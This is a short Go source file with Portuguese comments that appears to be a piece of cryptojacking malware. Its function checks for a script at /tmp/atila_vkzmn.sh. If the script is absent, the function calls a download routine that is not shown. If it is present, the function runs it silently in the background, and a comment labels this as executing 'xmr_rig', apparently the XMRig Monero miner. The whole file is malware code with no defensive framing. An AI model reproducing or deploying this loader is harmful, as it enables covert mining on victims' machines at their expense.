package main



import (

"os/exec"
"os"
"fmt"

)



//funcao para executa o vkzmn


func exec_vk (){

_,  err_open := os.Open("/tmp/atila_vkzmn.sh")



if  err_open != nil {



fmt.Println("atila_vkzmn.sh  nao encontrado")



down_atila_vkzmn_sh ()


return 

}




if  err_open == nil  {




run_atila_vkzmn :=  exec.Command("sh"  , "-c"  ,  "/tmp/./atila_vkzmn.sh") //execute xmr_rig



go run_atila_vkzmn.Run()




}
 



}
